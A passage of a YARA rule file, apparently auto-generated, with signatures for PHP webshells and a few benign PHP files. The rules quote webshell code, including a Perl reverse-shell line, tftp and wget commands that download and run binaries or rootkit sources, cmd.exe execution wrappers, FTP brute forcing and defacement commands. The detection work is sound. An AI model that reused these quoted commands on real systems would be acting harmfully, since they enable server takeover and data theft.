      $x6 = "</form><form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$tbl&baza=1&vn=$vn&db=$db'>" fullword ascii
      $x7 = "[<a href='$php_self?getdb=1&to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tb" fullword ascii
      $x8 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii
      $x9 = "md5 online encoder/decoder (brutforce) (php) - [<a href=http://nst.void.ru/?q=releases&download=4>DOWNLOAD</a>]" fullword ascii
      $x10 = "Read file content using MySQL - when <b>safe_mode</b>, <b>open_basedir</b> is <font color=green>ON</font><Br>" fullword ascii
      $s11 = "open STDIN,\\\"<&X\\\";open STDOUT,\\\">&X\\\";open STDERR,\\\">&X\\\";exec(\\\"/bin/sh -i\\\");" fullword ascii
      $s12 = "# Dump from: \".$_SERVER[\"SERVER_NAME\"].\" (\".$_SERVER[\"SERVER_ADDR\"].\")" fullword ascii
      $s13 = "<font color=green><b>You can change temp folder for dump file in your browser!<br>" fullword ascii
      $s14 = "1&p=sql&vn=$str[0]&baza=1&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]&ins_new_line=1'>$str[0]</a><br>\";" fullword ascii
      $s15 = "header(\"Content-disposition: attachment; filename=\\\"$download\\\";\");" fullword ascii
      $s16 = "<font color=red>Change variable &f_d=(here writable directory, expl: /tmp or c:/windows/temp)</font><br>" fullword ascii
      $s17 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii
      $s18 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1" ascii
      $s19 = "1&p=sql&vn=$str[0]&baza=1&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]'>$str[0]</a><br>\";" fullword ascii
      $s20 = "<tr><td>Login:</td><td><input name=l value=\".$_POST['l'].\"></td></tr>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and all of them
}

rule sig_1d4b374d284c12db881ba42ee63ebce2759e0b14
{
   meta:
      description = "php17 - file 1d4b374d284c12db881ba42ee63ebce2759e0b14.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ce3ae484ce28f4a708189126e690783830fddb05ec751f5a4c21b8d092c9d5c9"
   strings:
      $x1 = "<?php function vUMmFr($MkUOmK) { $MkUOmK=gzinflate(base64_decode($MkUOmK)); for($i=0;$i<strlen($MkUOmK);$i++) { $MkUOmK[$i] = ch" ascii
      $s2 = "<?php function vUMmFr($MkUOmK) { $MkUOmK=gzinflate(base64_decode($MkUOmK)); for($i=0;$i<strlen($MkUOmK);$i++) { $MkUOmK[$i] = c" fullword ascii
      $s3 = "G6N9elJi6irZUtJg6nXrbnttj5rVVOGwkrKV/Xi/2tN6rpBddxNMq55fENm5m56ZqXmtR2wqw3WLECuETfH7Tq6s1DrWQRLS7WYrw4nDTLngMInWVFrUNtuMs29RXKON" ascii
      $s4 = "ntrVUhXaILTZfGn2Oz17l0qS9fn+sBWXyrCit/j8hkhM83hvm6yQY6Ut61J+x5a2trhdSubMbM1la5rUBJZkEysmU82pQCPJW7e/VJ3BPOUSerubFlpmdujs15nJgCiV" ascii
      $s5 = "D7HZgAeme8hpfxmjGedsZigvsZIRcoJBPriSDGPBGQDLKC+BLMAzoGyEnb6PgwAEVB/VPmeid+Gf003s92SYP7DX+ATAgI/YvMARIPdlfpGNN8kjRGT02OzJ8KPa9y/z" ascii
      $s6 = "Asj/7zeM4mmTlWRNBMxuhusdhBJkORmkA+aygBb6VYtAif6+oIsiXtujIjJoG5p+MY8rUO4JN3jK2t/m8Y9Sxn/e/+OnbPIeVY5jnv54iD8xCq2tQx8dOlpoSTSnu5/R" ascii
      $s7 = "hr7x++Xjp0/ocQMMURhtvYLvgGCfPvklIhVDkReYzl8idwTRJcDo8ZHjccDI5cEYEk/Rw/iRo8Cn9Y4H9WM/x6Kp54HfmdMUMvaYelYm559hS/t/1/7fCNjIQcCzo4De" ascii
      $s8 = "S5veyyje74ttfPqHaN/77ZwUvvSocjRwAvr8IgI+vg9R1FENv8cP0c5/E5SBZMNdMLxvqQHo83AklV8DPTTI0UAA0BZveU8NXhi6Dx8uTFKOgdPpZZK/A81fhn0cjR8Z" ascii
      $s9 = "g1aN+90D2mD/NRb40X+Fo22D754Y/jXmbz3kjR0wNsC/ezA5fTp8saF8DGcuq3KMvotUdWXOlj5niP86qYN89+gT91juVr76PP0Ft7lIju9o17WuDvinD5QgAAi3Ce4E" ascii
      $s10 = "kl3QlzuWxYFAEYEZZQGdJ8O/aFcZiAdWCpC6BdLDpg3A+6DPpsc4nrw4zvxghsFphYEVCZxRQG6CJQBQrLAKxCzgOk1EnHas/P1oApj2BaJdIlyHtmxlfxtgeCnGCnRt" ascii
      $s11 = "cvAzSPYEAExE/f0WirV+p9Ofdfrl4rjZ791ib8L2fO/kpNLV2mHMs2eX16cg/R2RY2pwJxtVRW7XyPBEfyLbahdy4bFL/27lE3z8g+eeoPNBgysc63IVeKJW1vyNgBjE" ascii
      $s12 = "kHXWAktZZR7YNW28NGaklStsVDlZnuG1TDNRzjK11QhoWlsle/Jsn9iM95PxJknN1zqfW3SktTJyJWPba7GsfCCHwlAr8M3FZjPe7hL7BpftpuxlJdFVpFJxadWqpqsa" ascii
      $s13 = "E4DPhOyzbJnZj2ocKL6sk6NZytocmOWqn08WGrXKrmXU2nouQQAjxxm3KnpRqKyoSm8zZ/r12oRa991NMnUoLDLLQc8ad2pWYt4ih9LaLWiHmU1SU9Nd9ZQtpIs4qRfE" ascii
      $s14 = "i2VuQtsCu4LJMBW0OB5NqhBTZOAcM4CQqhU7FMq68panSHABlfDkICZFHUWsF2kZqB3w7dqvASic8tt1ZdQw+POsTZgWbe45O+9DZvaXm5xsBnlbmXdhNpD/hssdGddL" ascii
      $s15 = "WVCvkTvdFAO7R9FFHdo7Zy9zY2Q2aezuMf+9diybg++1I5vIiN7YerbZDzX45+RdllchLnef4fDJggxvMt2Fz0GGBtWJLRJaH2c0uPyQ+PPjcRwPbWEzsCKyuZfeQo95" ascii
      $s16 = "FrjxJHvsJ4yltbiNjXi6AgfuF+ysIvZbzJfohsmLTyqNLtkoCqiKCuHXd//8+eaOY36K3Xq43F6Zvi2P+hpK/CdHkzcOkHHmL0lvuxTOr9BdgAwNqHGuv3ohHMIt2rhs" ascii
      $s17 = "9qvAyHeivj3BGjEuunF20i4G078b+3dE3uMClT9B1p+HETr7Ke+E6fvI7lAmRun6I6bAiR8kMsGRqfjz47c6HegHLHo5EDu5HfhDegG9fhoqhg++YLpomL4mmLxHVM8k" ascii
      $s18 = "cc/Q7Fo04brok6/4BUG4Z8ACmDc/J40dZukKWKOhVOwPDFgCCBAEifvAA4vviy3bKCtISBMpaMsxMsfxWqQcfl7wC6Nzew/f5GNYAzSQRInG40J3MA7wm41J9JbHgFRV" ascii
      $s19 = "5W4hrrgO65jrUb7Z4eplhapy+/ZsKey6Jbk3z2Q6xYMxzW56eHbG5Vghm9Wria6y3RyM3XYk2wN5XKHYXKvH4oNN3l1tU9NpfjHIr4w8mFUzc9BZ2ESmNnDbvSG14XuV" ascii
      $s20 = "uNCV/GKs4m8tE0ODLuLpDo3N81UOOrQAunVq1kY/v3G9iDRMEMw4e3ENBrUi4mOwDoua0FzEhDZfxtKPN/MM07diGCruN6KJyqJF4+ObkZxY/Dl+F0x7GFdCFvaxyPrF" ascii
   condition:
      uint16(0) == 0x3c20 and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_9735037eae2f73171d007caca31fbfb6467850d5
{
   meta:
      description = "php17 - file 9735037eae2f73171d007caca31fbfb6467850d5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0a18abae4ed20eb3140925b78cce995a272b596f97191b1fb08024942ee7c854"
   strings:
      $x1 = "echo Exec_Run('/tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '" fullword ascii
      $x2 = "$exe = @$shell->exec(\"cmd.exe /c \".$cmd);" fullword ascii
      $x3 = "Str[8] = \"tftp -i 219.134.46.245 get server.exe c:\\\\\\\\server.exe\";" fullword ascii
      $x4 = "Str[6] = \"tftp -i 219.134.46.245 get server.exe c:\\\\server.exe\";" fullword ascii
      $x5 = "if(!empty($_POST['run'])) echo (@$shell->ShellExecute($run,'/c '.$cmd) == '0') ? '" fullword ascii
      $x6 = "$run = isset($_POST['run']) ? $_POST['run'] : 'cmd.exe';" fullword ascii
      $x7 = "@fputs($handle,\"GET \".$u_name.\" HTTP/1.1\\r\\nHost:\".$c_name.\"\\r\\nConnection: Close\\r\\n\\r\\n\");" fullword ascii
      $x8 = "<input type=\"text\" name=\"tcb\" id=\"tcb\" value=\"http://www.baidu.com/download/muma.exe\" style=\"width:500px;\">';" fullword ascii
      $x9 = "if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];}" fullword ascii
      $x10 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x11 = "$query = \"INSERT into Spider_Temp_Tab values (CONVERT(\".$shellcode.\",CHAR));\";" fullword ascii
      $x12 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] " ascii
      $x13 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] " ascii
      $x14 = "$res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $x15 = "elseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x16 = ": &lt;script language=javascript src=\"http://www.baidu.com/ad.js?EMTDSU\"&gt;&lt;/script&gt;</div></div>" fullword ascii
      $x17 = "$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'copy c:\\windows\\php.ini c:\\php.ini';" fullword ascii
      $s18 = "if(isset($_POST['mhost']) && isset($_POST['mport']) && isset($_POST['muser']) && isset($_POST['mpass']))" fullword ascii
      $s19 = "$Shell_Code = 'http://www.baidu.com/download/muma.exe';" fullword ascii
      $s20 = "$mhost = 'localhost'; $muser = 'root'; $mport = '3306'; $mpass = ''; $mdata = 'mysql'; $msql = 'select version();';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and all of them
}

rule sig_91241fc05105627c2f58942867db10b2b691574e
{
   meta:
      description = "php17 - file 91241fc05105627c2f58942867db10b2b691574e.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2e5511e45b7c9c6ca7e263ee8d8271214b2b6aae20f2796f4db7b53639f7a699"
   strings:
      $x1 = "if(!@function_exists('escapeshellarg')){$res=$api->WinExec(\"cmd.exe /c $cfe >\\\"$output\\\"\",0);}" fullword ascii
      $x2 = "if(!@function_exists('escapeshellarg')){$suntzu->Run('c:\\windows\\system32\\cmd.exe /c '.$cfe.' > \"'.$output.'\"');}" fullword ascii
      $x3 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - su" fullword ascii
      $x4 = "else{$res=$api->WinExec(\"cmd.exe /c \".@escapeshellarg($cfe).\" >\\\"$output\\\"\",0);}" fullword ascii
      $x5 = "else{$suntzu->Run('c:\\windows\\system32\\cmd.exe /c '.@escapeshellarg($cfe).' > \"'.$output.'\"');}" fullword ascii
      $x6 = "if(@ftp_login($connection,$_POST['ftp_login'],$user)) { echo \"[+] \".$_POST['ftp_login'].\":$user - success\\r\\n\"; $suc++; }" fullword ascii
      $x7 = "else if ($file=readzlib($_POST['loc_file'])) { $filedump = $file; } else { err(1,$_POST['loc_file']); $_POST['cmd']=\"\"; }" fullword ascii
      $x8 = "else if ($file=readzlib($_POST['d_name'])) { $filedump = $file; } else { err(1,$_POST['d_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $x9 = "echo sr(15,\"<b>\".$lang[$language.'_text53'].$arrow.\"</b>\",in('text','s_dir',85,$dir).\" * ( /root;/home;$tempdir )\");" fullword ascii
      $x10 = "echo sr(15,\"<b>\".$lang[$language.'_text73'].$arrow.\"</b>\",in('text','s_dir',85,$dir).\" * ( /root;/home;$tempdir )\");" fullword ascii
      $x11 = "{@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params'=>\"/c $" ascii
      $x12 = "{@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params'=>\"/c $" ascii
      $x13 = "elseif($file=moreread($_POST['e_name'])) { $filedump = $file; if(!@is_writable($_POST['e_name'])) { $only_read = 1; }; }" fullword ascii
      $x14 = "else{@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params'=>\"" ascii
      $x15 = "if(!@function_exists('escapeshellarg')){@win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.$cfe.' >" ascii
      $x16 = "if(!@function_exists('escapeshellarg')){@win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.$cfe.' >" ascii
      $x17 = "else{@win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.@escapeshellarg($cfe).' > \"'.$output.'\"')" ascii
      $x18 = "if (@pcntl_wifexited($status)){$res .= '[+] Done! Command \"'.$cfe.'\" successfully executed.';}" fullword ascii
      $x19 = "$api=new ffi(\"[lib='kernel32.dll'] int WinExec(char *APP,int SW);\");" fullword ascii
      $x20 = "'eng_text124'=>'Test bypass open_basedir, add data to file via error_log(php://) (PHP <= 5.1.4, 4.4.2)'," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 600KB and
      1 of ($x*)
}

rule sig_6840756a29c548fb6eae03918087734bd7fb96a1
{
   meta:
      description = "php17 - file 6840756a29c548fb6eae03918087734bd7fb96a1.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "382f844dc0eea1f706c9f613511fc4b3f5c39e2c51e988dcbb19245d6d333966"
   strings:
      $x1 = "<?php error_reporting(0);$___=urldecode($_='%70%72%65%67%5F%72'.$__='%65%70%6C%61%63%65');$___(\"::\\x65\",\"\\x65\\x76\\x61\\x6" ascii
      $s2 = "kLjX6mmgr9GKYmtoKYrFR0QHA//ZZLKIqOa/BFV49OYUEB/+8Zgv3JZVr0DHM0FvaNDqfFe2vMh74WIkDmOp4jyybGaxzRAAXkJ1uIyTq2hhBpdLl63auwkTO7SFa6HJ" ascii
      $s3 = "geThIGAtCcBtANp58tf+oL4YQP8UPNSspKDMd/AiUlWrUMs7wxOfRcIE4/qiv1ufVLMQZgkGWjOEy1UHP8vAWftr4cZ/Z/eOqwYHMV4Ji+9Js2jEa1Ts6d35knNaBjOb" ascii
      $s4 = "uefmhdM46utheGBUQUf4z723jjtABqAaVOYAXPINQyY3dKDIes9ALdxs4NW6QFuvoZ8xLkvJeNr76DLSw/6/kBsz08q6fg0G0eyErmD0kzUH1a/RtgQs3vCNEP5LxQGR" ascii
      $s5 = "7kBss3kXR+Q78J7k45Kf45bmj3uYiQ+GGHYIIVNjVb88v/4NPaRoY7dt7+OWKi2jg8e3/Z0FMafW/oEG2RaCx2F/YGVGxXMs4Xnq0WvCCgetQjOR7lgjg5Hm/rzcOLiG" ascii
      $s6 = "jarRtiaXaVdEZ6WQOmmFAP0Uwwe50LCedjQgR4vnMarW4JF37+Ln2+DQSLPJR9GIMslwy/1wS/szNZHlKtzlbSnExd6q9F10yZGtYbzaIitPq0jlWdhL2eGeTmK7EHZe" ascii
      $s7 = "09LTFlw1jSXt/qubOwugUeCIIR6bcOvdeEpLYP4ztgvweJPgWFTp9fiSnemxhjFQFsedzaNeFYBM6EW1mos2davX6QNPasB8Qxv7Fs7Y5sH1ecGDR4YTmu2SLN2PhSGC" ascii
      $s8 = "JGP0cR3oqfshooWV36TZuP4VfDSOKftxQM/hHIYmEnw4g/SCRdwK1hOM2xcD2sZTAbJvfOtDSUGxIkjaMACQUFHI8YwmNaTSyKxgh1q5zbiPBLhF4htcUr9bjj3v3Lzx" ascii
      $s9 = "U5QeIwJ9F6HoAJy5kCKJw1M4zSUvOplgdsAqGvMLsNPf9vzVfYURVaHmTo4PhTzsQ3qGab1bIRcTT99/HKxyuGdL7HKSAD1WGx0OeAJzQcb6sBe41nPDm5ZxDUiEWvX2" ascii
      $s10 = "mpVtGpodwc2oN8+2UemTT9m5GxYJs5zeIHVZmG8tw95pxJ1yBZ5NjGvFX0b6UmcfRtCfODaBjrE14g/7qwruC5rQJgeT6bub9gABOHchvnFbTClFY0RrZOggYV88EHf4" ascii
      $s11 = "QaFeWk5GHFmFafzMbJoklOgsxn6bi4yQcerUXncw9JfBEhyzz5OyRmPJSpcc6ohlttWvV9cv1EjEmp5mRZTBtB2iv4GedgKQ5olfnjycK6WhANDzL+sat7giZCQkGNKu" ascii
      $s12 = "kdvmtKV43A1K0szMDaonrBofxk92GFCOzfNpM3uvKfiUWxzQbWGBcIS7pLpkDVyhZTKdJcUI/cKRHVWEVkhz2/qxvY6QMeTZ69GEtUmQfCkQev1adJs3ixMkOuWmtgFI" ascii
      $s13 = "okwg5QkgpOsTtgxE6Ul/mBppynrR9QLz7J9M++VbKCgVqbU46JbUYZUImGwIic+sL7JgvhtNR7K0P4tODagBkO2jmUA8/aIVLPQKuliGFRzTI/fHYsrmRxOx6st2jnTj" ascii
      $s14 = "IR3+YUl3L6aVGyEoRWrY0Hu93eNCr3AlNXc4Y5sJOKN6XVSAMT3lDBXa2of5wpB5lH/NpoGmPCe+l+GrUWjm+NRaqsBIOkT5hTm0eVSTBZhY6ACoaFuSC8kNxqEvzcvj" ascii
      $s15 = "LMgr4zEJ+YE1VQSMjeMjpms47rLxnK1SZ/0RmCWVthadwcDK6MW4O5LRx4ayn3haxNWyXeOAJFU+mbaBumi4p2tFxRxjSJ38jCJwle6WdbFMF1n18pPWvX9t+V/wbF75" ascii
      $s16 = "6U6r80H1OL5F0ZhM/UdiQnVx/7d+8UtbsgTKRDT4/s6HzYH5J5Qiq4HEsUPCTXjp5GNTk3j2iuWVnu9BiNwE06F/V/JnnWflHev3XHR+t6BuKv+IEJHr4y/0uQvDrYyu" ascii
      $s17 = "OH7L17iUKezP8fTYHngS3NxtLJ6hUWjpj3LiyzB4+D3zathQXRjoD6dAGtf84elMDtmp+m4zCUKX8Ga0ihLxsT/w1+HSWLndRRtcusinJZ1zm7W/Zxgm00c4GIHA2LJ5" ascii
      $s18 = "/kECW4T0FSNUJstiA7xyjfqBaWFLLlpoLeXR4BGoNOAiaJBDVA2RxJAu6j+AQazkhI/gdULHzm77oiUylCmDEiAmkWyYakDO1WmYXBETZW9jPO3BMjIBKVOvhRs86FJR" ascii
      $s19 = "2a8lpVt6GGikwndxnTHvgGrLQmd1O0uMgLWf/ltMpQmqDjNSPSt0TmKKb20FWUK7S5p1L8LtRX4TACdYCcNNvfPvW7maBh7HkUSGZoL624ugVwCphXpdf6agGH5/MiJC" ascii
      $s20 = "RpTTimYpoNjKjp+1uRGSxjbZ8K90OclIHWos8GlE40moDQ/FkSYfutlxB236OfZmo/3OUABJyT+pEwL8seOjOLj04IE03sLALr87MMsy4UllrUNTPOVqJsKRgK0jOiPg" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule a3a45774024ad0f93c71041f4baf72ad6ca34522
{
   meta:
      description = "php17 - file a3a45774024ad0f93c71041f4baf72ad6ca34522.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6d8435d732262dd06b1022983eb90db9bba800e4f25984e616ee143d26561621"
   strings:
      $x1 = "John The Ripper [<a href=http://www.openwall.com/john/ target=_blank>Web</a>]</form><br>\";" fullword ascii
      $x2 = "$serv = @mysql_connect($adress.\":\".$port, $login,$pass) or die(\"<font color=red>Error: \".mysql_error().\"</font>\");" fullword ascii
      $x3 = "# example: Delete autoexec.bat (nst) del c:\\autoexec.bat" fullword ascii
      $x4 = "[<a href='$php_self?getdb=1&to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tbl" ascii
      $x5 = "<form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$tbl&vnutr=1&baza=1&vn=$vn&db=$db'>" fullword ascii
      $x6 = "</form><form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$tbl&baza=1&vn=$vn&db=$db'>" fullword ascii
      $x7 = "[<a href='$php_self?getdb=1&to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tb" fullword ascii
      $x8 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii
      $x9 = "md5 online encoder/decoder (brutforce) (php) - [<a href=http://nst.void.ru/?q=releases&download=4>DOWNLOAD</a>]" fullword ascii
      $x10 = "Read file content using MySQL - when <b>safe_mode</b>, <b>open_basedir</b> is <font color=green>ON</font><Br>" fullword ascii
      $s11 = "open STDIN,\\\"<&X\\\";open STDOUT,\\\">&X\\\";open STDERR,\\\">&X\\\";exec(\\\"/bin/sh -i\\\");" fullword ascii
      $s12 = "# Dump from: \".$_SERVER[\"SERVER_NAME\"].\" (\".$_SERVER[\"SERVER_ADDR\"].\")" fullword ascii
      $s13 = "<font color=green><b>You can change temp folder for dump file in your browser!<br>" fullword ascii
      $s14 = "1&p=sql&vn=$str[0]&baza=1&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]&ins_new_line=1'>$str[0]</a><br>\";" fullword ascii
      $s15 = "header(\"Content-disposition: attachment; filename=\\\"$download\\\";\");" fullword ascii
      $s16 = "<font color=red>Change variable &f_d=(here writable directory, expl: /tmp or c:/windows/temp)</font><br>" fullword ascii
      $s17 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii
      $s18 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1" ascii
      $s19 = "1&p=sql&vn=$str[0]&baza=1&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]'>$str[0]</a><br>\";" fullword ascii
      $s20 = "<tr><td>Login:</td><td><input name=l value=\".$_POST['l'].\"></td></tr>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and all of them
}


rule sig_6eeaeaff012223eb65c78829820ee4c1f8abcb0e
{
   meta:
      description = "php17 - file 6eeaeaff012223eb65c78829820ee4c1f8abcb0e.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "22b07c70714684e593f85622cb2993b3d25e093a5ed9509277758df62f081504"
   strings:
      $s1 = "unserialize($_GET['saved_code']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_20170728020000_migrate_datalists_to_config
{
   meta:
      description = "php17 - file 20170728020000_migrate_datalists_to_config.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "80694169257779f83f15d5d799a09d0573ab9d93b165e206b1bda869e0b9d598"
   strings:
      $s1 = "WHERE name NOT IN ('processed_upgrades', 'version')" fullword ascii
      $s2 = "AND name NOT IN ('processed_upgrades', 'version')" fullword ascii
      $s3 = "* @warning Note that the datalists values will not be populated back into the table" fullword ascii
      $s4 = "* Migrates legacy 2.x datalists values to config table" fullword ascii
      $s5 = "*          There is no way of telling which config values have come from datalists table" fullword ascii
      $s6 = "* ) ENGINE=MyISAM DEFAULT CHARSET=utf8;" fullword ascii
      $s7 = "* Validates that there are no duplicate names in datalist and config tables" fullword ascii
      $s8 = "* PRIMARY KEY (`name`)" fullword ascii
      $s9 = "$prefix = $this->getAdapter()->getOption('table_prefix');" fullword ascii
      $s10 = "* CREATE TABLE `prefix_datalists` (" fullword ascii
      $s11 = "* `name` varchar(255) NOT NULL," fullword ascii
      $s12 = "* `value` text NOT NULL," fullword ascii
      $s13 = "if (!$this->hasTable('datalists') || !$this->hasTable('config')) {" fullword ascii
      $s14 = "* Recreate datalists table" fullword ascii
      $s15 = "* @throws InstallationException" fullword ascii
      $s16 = "WHERE name IN (SELECT name FROM {$prefix}config)" fullword ascii
      $s17 = "SELECT * FROM {$prefix}datalists" fullword ascii
      $s18 = "class MigrateDatalistsToConfig extends AbstractMigration {" fullword ascii
      $s19 = "$this->insert('config', [" fullword ascii
      $s20 = "'engine' => \"MyISAM\"," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule sig_01f78be6f7cad02658508fe4616098a9
{
   meta:
      description = "php17 - file 01f78be6f7cad02658508fe4616098a9.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ae6e0b74f1a1697985e45ec9fbd291fbc9ace52680fc2fd14726abf66859138a"
   strings:
      $x1 = "RKS.COM/\\\">x2300 Shell</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");}" fullword ascii
      $x2 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $x3 = "?><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language" ascii
      $x4 = "myshellexec(\"lynx -dump $adires > sayko_bind;chmod 777 sayko_bind;./sayko_bind\");" fullword ascii
      $x5 = "function c999ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)" fullword ascii
      $x6 = "myshellexec(\"wget $adires -O sayko_bind;chmod 777 sayko_bind;./sayko_bind\");" fullword ascii
      $x7 = "echo \"<b>Your ip: <a href=http://whois.domaintools.com/\".$_SERVER[\"REMOTE_ADDR\"].\">\".$_SERVER[\"REMOTE_ADDR\"].\"</a> - Se" ascii
      $x8 = "iv=\\'refresh\\' content=\\'5\\\\;url=http\\:\\/\\/ALTURKS.COM\\'>/g' index.*\">index.* Mass Defacement" fullword ascii
      $x9 = "<OPTION VALUE=\"wget http://twofaced.org/linux2-6-all.c\">Linux Kernel 2.6.* rootkit.c" fullword ascii
      $x10 = "*  -Execute Mig-Log Logcleaner                           " fullword ascii
      $x11 = "if ($act == \"about\") {echo \"<center><b>Credits:<br>Idea, leading and coding by tristram[CCTeaM].<br>Beta-testing and some tip" ascii
      $x12 = "$accessdeniedmess = \"<a href=\\\"http://ALTURKS.COM\\\">x2300 Locus7Shell v.\".$shver.\"</a>: access denied\";" fullword ascii
      $x13 = "<OPTION VALUE=\"sed -i -e 's/<html>/<div style=\\'position\\:absolute\\;width\\:2000px\\;height\\:2000px\\;background-color\\:bl" ascii
      $x14 = "echo(\"<center><b>Bind Shell Backdoor:</b></br></br><form name=form method=POST>" fullword ascii
      $x15 = "$logfile = $tmpdir_logs.\"c999sh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $x16 = "<OPTION VALUE=\"wget http://precision-gaming.com/sudo.c\">wget Linux sudo stack overflow" fullword ascii
      $x17 = "$fqb_log = \"FTP Quick Brute (called c999shell v. \".$shver.\") started at \".date(\"d.m.Y H:i:s\").\"\\r\\n\\r\\n\";" fullword ascii
      $s18 = "$c999sh_updateurl = \"http://ALTURKS.COM/files/lshell_update/\"; //Update server" fullword ascii
      $s19 = "$out = \"# Dumped by Locous7Shell.SQL v. \".$shver.\"" fullword ascii
      $s20 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" b" ascii
   condition:
      uint16(0) == 0x733c and filesize < 700KB and
      1 of ($x*) and all of them
}

rule _machine_config
{
   meta:
      description = "php17 - file _machine_config.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "918609b1ac3fb9af37bd79d7e88bbbba617c5cc82a78d6798fec12542547a634"
   strings:
      $s1 = "* This file should not be added to version control, rather a template" fullword ascii
      $s2 = "/** the root url of the application with trailing slash, for example http://localhost/adserv/ */" fullword ascii
      $s3 = "* Normally DB connection info would go here, but phreeze builder doesn't actually" fullword ascii
      $s4 = "GlobalConfig::$CONNECTION_SETTING->Password = \"\";" fullword ascii
      $s5 = "GlobalConfig::$ROOT_URL = RequestUtil::GetServerRootUrl() . 'phreeze/builder/';" fullword ascii
      $s6 = "* machine on which the app is running (ex. local, staging or production)." fullword ascii
      $s7 = "* MACHINE-SPECIFIC CONFIGURATION SETTINGS" fullword ascii
      $s8 = "GlobalConfig::$CONNECTION_SETTING = new ConnectionSetting();" fullword ascii
      $s9 = "GlobalConfig::$CONNECTION_SETTING->Username = \"\";" fullword ascii
      $s10 = "* file should be added instead and then copied for each install" fullword ascii
